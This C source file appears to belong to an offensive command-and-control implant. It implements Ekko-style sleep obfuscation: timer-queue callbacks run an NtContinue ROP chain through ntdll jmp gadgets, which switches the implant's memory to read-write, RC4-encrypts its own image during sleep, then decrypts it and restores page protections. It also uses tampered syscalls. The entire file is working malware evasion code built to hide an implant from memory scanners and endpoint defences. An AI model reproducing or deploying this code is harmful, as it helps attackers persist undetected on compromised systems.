#include "../../../../headers/agent/evasion/Common.h"

BOOL EkkoSleepObf(
	_In_ DWORD TimeOut
)
{
    HANDLE   Queue = { 0 };
    HANDLE   Timer = { 0 };
    HANDLE   ThdSrc = { 0 };
    HANDLE   EvntStart = { 0 };
    HANDLE   EvntTimer = { 0 };
    HANDLE   EvntDelay = { 0 };
    HANDLE   EvntWait = { 0 };
    BYTE    Buf[16] = { 0 };
    USTRING  Key = { 0 };
    USTRING  Img = { 0 };
    PVOID    ImgBase = { 0 };
    CONTEXT  TimerCtx = { 0 };
    CONTEXT  ThdCtx = { 0 };
    CONTEXT  Rop[35] = { 0 };
    DWORD    Value = { 0 };
    DWORD    Delay = { 0 };
    BOOL     Success = { 0 };
    NT_TIB   NtTib = { 0 };
    NT_TIB   BkpTib = { 0 };
    NTSTATUS NtStatus = { 0 };
    DWORD    Inc = { 0 };
    LPVOID   ImageBase = { 0 };
    SIZE_T   ImageSize = { 0 };
    WORD     NumSections = 0;
    LPVOID   TxtBase = { 0 };
    SIZE_T   TxtSize = { 0 };
    DWORD    Protect = { 0 };
    BYTE     JmpBypass = agent->config->JmpRbx;
    PVOID    JmpGadget = { 0 };
    BYTE     JmpPad[] = { 0xFF, 0xE0 };

    ImgBase = TxtBase = agent->PEInfo->ModuleBaseAddr;
    ImageSize = TxtSize = agent->PEInfo->ImageSize;
    NumSections = agent->PEInfo->NumSections;
    pProtectData ProtectArr = (pProtectData)agent->apis->pLocalAlloc(LPTR, 25 * sizeof(ProtectData));

    GetVirtualProtections(ProtectArr);


    Protect = PAGE_EXECUTE_READWRITE;

    if(JmpBypass == OBFU_JMP_RBX) {
        JmpPad[1] = 0x23;
    }

    JmpGadget = FindJmpGadget((ULONG_PTR)agent->apis->hNtdll + 0x1000, 0x1000*0x1000, JmpPad, sizeof(JmpPad));

    /* Create Random Key for payload encryption during sleep cycle. 16 byte key.*/
    for (BYTE i = 0; i < 16; i++)
    {
        Buf[i] = GenerateRandomNumber();
    }

    // set specific context flags.
	ThdCtx.ContextFlags = TimerCtx.ContextFlags = CONTEXT_FULL;

    Key.Buffer = Buf;
    Key.Length = Key.MaximumLength = sizeof(Buf);

    Img.Buffer = ImgBase = agent->PEInfo->ModuleBaseAddr;
	Img.Length = Img.MaximumLength = agent->PEInfo->ImageSize;

    NtStatus = agent->apis->pRtlCreateTimerQueue(&Queue);

    if (NtStatus == 0)
    {
        if (
            ((NtStatus = agent->apis->pNtCreateEvent(&EvntTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)) == 0) &&
            ((NtStatus = agent->apis->pNtCreateEvent(&EvntStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)) == 0) &&
            ((NtStatus = agent->apis->pNtCreateEvent(&EvntDelay, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)) == 0)
            )
        {
            NtStatus = agent->apis->pRtlCreateTimer(Queue, &Timer, (LPVOID)agent->apis->pRtlCaptureContext, &TimerCtx, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD);

            if (NtStatus == 0)
            {
                //send the event that we got the context of timers thread.
                if ((NtStatus = agent->apis->pRtlCreateTimer(Queue, &Timer, (LPVOID)EventSet, EvntTimer, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD)) == 0)
                {
                    //wait untilk we successfully retrieved the timers thread.
                    if (!(NtStatus = agent->apis->pNtWaitForSingleObject(EvntTimer, FALSE, NULL) >= 0))
                    {
                        printf("[error] attempting to wait for timer event failed. %lx\n", NtStatus);
                        goto END;
                    }

                    //start preparing ROP chains.
                    for (int i = 0; i < 13 + NumSections; i++) //create rop chains for virtual protect number of sections + 2
                    {
                        MemoryCopy(&Rop[i], &TimerCtx, sizeof(CONTEXT));
                        Rop[i].Rip = (UINT_PTR)JmpGadget;
                        Rop[i].Rsp -= sizeof(PVOID);
                    }

                    /* start rop chain with WaitForSingleObject. */
                    SetJmpObfuscation(Inc, agent->apis->pWaitForSingleObjectEx);
                    Rop[Inc].Rcx = (UINT_PTR)EvntStart;
                    Rop[Inc].Rdx = (UINT_PTR)INFINITE;
                    Rop[Inc].R8 = (UINT_PTR)0; // FALSE.
                    Inc++;

                    //do protect change for entire binary.
                    SetJmpObfuscation(Inc, agent->apis->pVirtualProtect);
                    Rop[Inc].Rcx = (UINT_PTR)ImgBase;
                    Rop[Inc].Rdx = (UINT_PTR)ImageSize;
                    Rop[Inc].R8 = (UINT_PTR)PAGE_READWRITE;
                    Rop[Inc].R9 = (UINT_PTR)&Value;
                    Inc++;

                    /*Encrypt Image */
                    SetJmpObfuscation(Inc, agent->apis->pSystemFunction032);
                    Rop[Inc].Rcx = (UINT_PTR)&Img;
                    Rop[Inc].Rdx = (UINT_PTR)&Key;
                    Inc++;


                    /* Sleep */
                    SetJmpObfuscation(Inc, agent->apis->pWaitForSingleObjectEx);
                    Rop[Inc].Rcx = (UINT_PTR)NtCurrentProcess();
                    Rop[Inc].Rdx = (UINT_PTR)(Delay + TimeOut);
                    Rop[Inc].R8 = (UINT_PTR)0; // FALSE.
                    Inc++;


                    /* Decrypt */
                    SetJmpObfuscation(Inc, agent->apis->pSystemFunction032);
                    Rop[Inc].Rcx = (UINT_PTR)&Img;
                    Rop[Inc].Rdx = (UINT_PTR)&Key;
                    Inc++;

                    /* set  our memory protections back to original states. */
                    int index = 0;
                    DWORD PrevRegionsLength = 0;
                    while (ProtectArr[index].RegionSize > 0)
                    {
                        SetJmpObfuscation(Inc, agent->apis->pVirtualProtect);
                        Rop[Inc].Rcx = (UINT_PTR)ImgBase + PrevRegionsLength;
                        Rop[Inc].Rdx = (UINT_PTR)ProtectArr[index].RegionSize;
                        Rop[Inc].R8 = (UINT_PTR)ProtectArr[index].ProtectValue;
                        Rop[Inc].R9 = (UINT_PTR)&Value;
                        PrevRegionsLength += ProtectArr[index].RegionSize;
                        index++;
                        Inc++;
                    }

                    /* End Rop Chain */
                    SetJmpObfuscation(Inc, agent->apis->pNtSetEvent);
                    Rop[Inc].Rcx = (UINT_PTR)EvntDelay;
                    Rop[Inc].Rdx = (UINT_PTR)NULL;
                    Inc++;

                    /*
                    Execute & Queue the timers
                    */
                    for (int i = 0; i < Inc; i++)
                    {
                        if ((NtStatus = agent->apis->pRtlCreateTimer(Queue, &Timer, (LPVOID)agent->apis->pNtContinue, &Rop[i], Delay += 100, 0, WT_EXECUTEINTIMERTHREAD)) < 0)
                        {
                            printf("[error] attempting to create timers for execution: %lx\n", NtStatus);
                            goto END;
                        }
                    }

                    //stack spoofing enabled.
                    /* Wait for the sleep to end*/

                    if(!TAMPER_SYSCALL(agent->apis->pNtSignalAndWaitForSingleObject, 4, EvntStart, EvntDelay, FALSE, NULL)) {
                        Success = TRUE;
                    } else {
                        Success = FALSE;
                    }
                }
                else {
                    printf("[error] failed to create timer. %lx\n", NtStatus);
                }

            }
            else {
                printf("[error] failed to create timer. %lx\n", NtStatus);
            }
			
        }
        else {
            printf("[error] failed to create timer events. %lx\n", NtStatus);
        }
    }
	else {
		printf("[error] failed to create timer queue. %lx\n", NtStatus);
	}


END:
    if (Queue) {
        agent->apis->pRtlDeleteTimerQueue(Queue);
        Queue = NULL;
    }

    if (EvntTimer) {
        agent->apis->pNtClose(EvntTimer);
        EvntTimer = NULL;
    }

    if (EvntStart) {
        agent->apis->pNtClose(EvntStart);
        EvntStart = NULL;
    }

    if (EvntDelay) {
        agent->apis->pNtClose(EvntDelay);
        EvntDelay = NULL;
    }

    if (EvntWait) {
        agent->apis->pNtClose(EvntWait);
        EvntWait = NULL;
    }

    if (ThdSrc) {
        agent->apis->pNtClose(ThdSrc);
        ThdSrc = NULL;
    }

    /* clear the structs from stack */
    for (int i = 0; i < 13; i++) {
        RtlSecureZeroMemory(&Rop[i], sizeof(CONTEXT));
    }

    /* clear key from memory */
    RtlSecureZeroMemory(Buf, sizeof(Buf));

    return Success;
}

void GetVirtualProtections(pProtectData ProtectArr) {
    MEMORY_BASIC_INFORMATION MBI = { 0 };
    SIZE_T OutSize = 0;
    DWORD TotalLength = 0;
    INT index = 0;
    NTSTATUS Success = 0;

    while (TotalLength < agent->PEInfo->ImageSize)
    {
        Success = TAMPER_SYSCALL(agent->apis->pNtQueryVirtualMemory, 6, NtCurrentProcess(), (BYTE*)agent->PEInfo->ModuleBaseAddr + TotalLength, MemoryBasicInformation, &MBI, sizeof(MEMORY_BASIC_INFORMATION), &OutSize);
        //Success = agent->apis->pNtQueryVirtualMemory(NtCurrentProcess(), (BYTE*)agent->PEInfo->ModuleBaseAddr + TotalLength, MemoryBasicInformation, &MBI, sizeof(MEMORY_BASIC_INFORMATION), &OutSize);
        if (Success == 0)
        {
            TotalLength += MBI.RegionSize;
            MemoryCopy(&ProtectArr[index].RegionSize, &MBI.RegionSize, sizeof(MBI.RegionSize));
            MemoryCopy(&ProtectArr[index].ProtectValue, &MBI.Protect, sizeof(MBI.Protect));
            index++;
        }
        else
        {
            break;
        }

    }
}